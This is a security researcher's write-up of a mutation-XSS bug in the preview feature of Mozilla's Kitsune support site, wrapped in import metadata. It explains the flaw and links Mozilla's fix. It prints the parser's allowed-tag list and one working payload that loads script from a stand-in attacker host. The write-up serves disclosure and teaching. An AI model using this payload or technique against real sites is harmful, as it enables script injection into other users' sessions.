---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-22_mxss-in-supportmozillaorg.md
original_filename: 2021-09-22_mxss-in-supportmozillaorg.md
title: mXSS in support.mozilla.org
category: documents
detected_topics:
- xss
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: 10f31542ce7f2e0262ba9f3c80ab0d6c4d44344492f6da5c58fed42065fdb0b8
text_sha256: 760d89951cdc73814b148299c97e5cfe8dbae10e970936bf161a4eab8fd00993
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# mXSS in support.mozilla.org

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-22_mxss-in-supportmozillaorg.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `10f31542ce7f2e0262ba9f3c80ab0d6c4d44344492f6da5c58fed42065fdb0b8`
- Text SHA256: `760d89951cdc73814b148299c97e5cfe8dbae10e970936bf161a4eab8fd00993`


## Content

---
title: "mXSS in support.mozilla.org"
url: "https://gccybermonks.com/posts/mxss/"
final_url: "https://gccybermonks.com/posts/mxss/"
authors: ["Guilherme Keerok (@k33r0k)", "Luan Herrera (@lbherrera_)"]
programs: ["Mozilla"]
bugs: ["XSS"]
publication_date: "2021-09-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3295
---

# [mXSS in support.mozilla.org](https://gccybermonks.com/posts/mxss/)

by Guilherme Keerok

This is another bug that was discovered during [@duphouse](https://twitter.com/duph0use), and was the result of a collaboration with [@lbherrera](https://twitter.com/lbherrera_).

It was found on [Kitsune](https://github.com/mozilla/kitsune), which is an open-source software that runs SUMO (support.mozilla.org), and provides support for Firefox and other Mozilla software.

It works similarly to a wiki, containing several functionalities for users to create, read or edit articles.

During the tests, the preview functionality caught our attention, as it allowed users to preview their changes to the article before submitting it - and more interestingly - it was also allowing a small subset of HTML tags to be included that got rendered inside the page.

![](https://i.imgur.com/dJQ3Xlw.png)

Initially, as the focus was to achieve XSS, we thought a bypass to [`bleach`](https://github.com/mozilla/bleach) would be needed as it is an allowed-list-based HTML sanitizing library maintained by Mozilla and commonly used in Mozilla services, but that quickly proved to be far from the truth as we began to investigate Kitsune’s source code.

![](https://i.imgur.com/sWGREaY.png)

_Excerpt from[/kitsune/sumo/static/sumo/js/ajaxpreview.js](https://github.com/mozilla/kitsune/blob/20c0c434b8a9fc39a19d319890054c5b914cc34a/kitsune/sumo/static/sumo/js/ajaxpreview.js#L40)_

From the code above, there are three points worth highlighting to understand how the application works:

  1. Line 43, which triggers the get-preview bind when the user clicks on the preview button.
  2. Line 59, which makes a POST request to previewUrl (more about this later), sending the content you are trying to preview in the body, and then triggers the show-preview bind with its response.
  3. Line 70, which renders the response inside an element through the use of JQuery’s html function (this is generally unsafe).

After a quick lookup in the source, we found where `previewUrl` was pointing to, as well as what was being done with the response.

![](https://i.imgur.com/DI7vxY2.png)

![](https://i.imgur.com/UzF4Jti.png)

![](https://i.imgur.com/4oiyaRo.png)

![](https://i.imgur.com/GJDug0F.png)

After going down the rabbit hole, we found that Kitsune’s parser was using a list of allowed HTML tags that could be used to do an mXSS attack (since the allowed attributes list didn’t have anything interesting).

![](https://i.imgur.com/ecE7T7k.png)
  
  
  >>> from wikimarkup.parser import ALLOWED_TAGS
  >>> ALLOWED_TAGS
  ['br', 'hr', 'img', 'source', 'b', 'del', 'i', 'ins', 'u', 'font', 'big', 'small', 'sub', 'sup', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'cite', 'code', 'em', 's', 'strike', 'strong', 'tt', 'var', 'div', 'center', 'blockquote', 'ol', 'ul', 'dl', 'table', 'caption', 'pre', 'p', 'span', 'u', 'li', 'dd', 'dt', 'video', 'section', 'noscript', 'table', 'tr', 'td', 'th', 'div', 'blockquote', 'ol', 'ul', 'dl', 'font', 'big', 'small', 'sub', 'sup', 'span', 'img', 'tbody', 'thead', 'tfoot', 'colgroup', 'col', 'section', 'a']
  

After that, it was only a matter of playing with the tags and attributes until getting a payload that was allowed by Kitsune’s parser, but that when rendered through JQuery’s html function would be mutated and execute arbitrary javascript.

The final payload used was: `<noscript><noscript alt="<img><script src="//attacker。com/alert.js"`

PoC video:

_A side note_ : this vulnerability was ineligible from Mozilla’s bug bounty program since the domain isn’t part of their scope, but it was an interesting finding anyhow.

You can see all the changes made by Mozilla to fix the issue here: <https://github.com/mozilla/kitsune/commit/395ebf68f762d893ba73e679fc7083e9e7e6e508>

Posted on 22\. September 2021
